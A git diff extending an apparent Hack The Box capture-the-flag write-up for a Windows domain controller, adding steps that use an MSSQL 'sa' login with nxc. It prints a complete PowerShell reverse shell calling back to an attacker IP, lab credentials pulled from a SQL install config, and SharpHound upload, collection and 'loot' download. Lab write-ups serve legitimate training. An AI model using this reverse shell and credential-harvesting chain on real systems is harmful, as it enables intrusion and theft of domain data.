@@ -175,7 +175,6 @@ SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBM
 ...
 ```
 
-
 Add `sa` to users 
 ```bash
 echo 'sa' >> users.txt
@@ -185,6 +184,53 @@ nxc mssql 'DC01' -u users.txt  -p creds.txt --local-auth
 ...
 MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
 ```
+
+Open a listener
+```
+nc -nvlp 9001
+```
+
+Send a Powershell reverse shell using the `sa` account
+```bash
+nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth -X '$LHOST = "10.10.14.17"; $LPORT = 9001; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'
+```
+
+There is another password for a `sql_svc` account `WqSZAF6CysDQbGb3`
+```powershell
+pwd
+C:\SQL2019\ExpressAdv_ENU
+
+more sql-Configuration.INI
+[OPTIONS] ACTION="Install" QUIET="True" FEATURES=SQL INSTANCENAME="SQLEXPRESS" INSTANCEID="SQLEXPRESS" RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS" AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE" AGTSVCSTARTUPTYPE="Manual" COMMFABRICPORT="0" COMMFABRICNETWORKLEVEL=""0" COMMFABRICENCRYPTION="0" MATRIXCMBRICKCOMMPORT="0" SQLSVCSTARTUPTYPE="Automatic" FILESTREAMLEVEL="0" ENABLERANU="False"  SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS" SQLSVCACCOUNT="SEQUEL\sql_svc" SQLSVCPASSWORD="WqSZAF6CysDQbGb3" SQLSYSADMINACCOUNTS="SEQUEL\Administrator" SECURITYMODE="SQL" SAPWD="MSSQLP@ssw0rd!" ADDCURRENTUSERASSQLADMIN="False" TCPENABLED="1" NPENABLED="1" BROWSERSVCSTARTUPTYPE="Automatic" IAcceptSQLServerLicenseTerms=True 
+```
+
+Upload SharpHound
+```powershell
+nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --put-file SharpHound.exe 'C:\Users\Public\SharpHound.exe'
+MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
+MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
+MSSQL       10.10.11.51     1433   DC01             [*] Copy SharpHound.exe to C:\Users\Public\SharpHound.exe
+MSSQL       10.10.11.51     1433   DC01             [*] Size is 1286656 bytes
+MSSQL       10.10.11.51     1433   DC01             [+] File has been uploaded on the remote machine
+```
+
+Collect the loot
+```powershell
+pwd
+C:\users\public
+
+.\SharpHound.exe -c all --zipfilename loot.zip
+```
+
+Download the loot
+```powershell
+nxc mssql 'DC01' -u 'sa'  -p 'MSSQLP@ssw0rd!' --local-auth --get-file 'C:\Users\Public\20250615120137_loot.zip' loot.zip
+
+...
+"C:\Users\Public\20250615120137_loot.zip" was downloaded to "loot.zip"
+```
+
+
 
 
 
